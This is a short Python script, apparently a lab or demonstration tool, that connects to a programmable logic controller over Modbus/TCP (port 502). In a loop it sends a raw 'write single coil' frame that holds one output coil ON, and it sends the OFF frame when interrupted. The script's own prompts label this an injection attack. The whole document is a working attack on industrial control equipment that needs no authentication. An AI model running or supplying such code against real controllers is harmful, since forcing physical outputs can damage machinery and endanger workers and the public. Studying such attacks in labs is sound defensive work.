import socket

TCP_IP = "192.168.1.200"
TCP_PORT = 502

BUFFER_SIZE = 1024
ON_MESSAGE = b"\x00\x00\x00\x00\x00\x06\x01\x05\x03\x21\xff\x00"
OFF_MESSAGE = b"\x00\x00\x00\x00\x00\x06\x01\x05\x03\x21\x00\x00"
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print("Attempting to connect to the PLC...")
try:
	s.connect((TCP_IP,TCP_PORT))
except:
	input("Could not connect! Press Enter to exit.")
	exit()
input("Connected! Press Enter to start the attack.")
print("Sending injection attack. Press Ctrl-C to exit.")
while True:
	try:
		s.send(ON_MESSAGE)
		s.recv(BUFFER_SIZE)
	except:
		s.send(OFF_MESSAGE)
		s.recv(BUFFER_SIZE)
		s.close()
		exit()
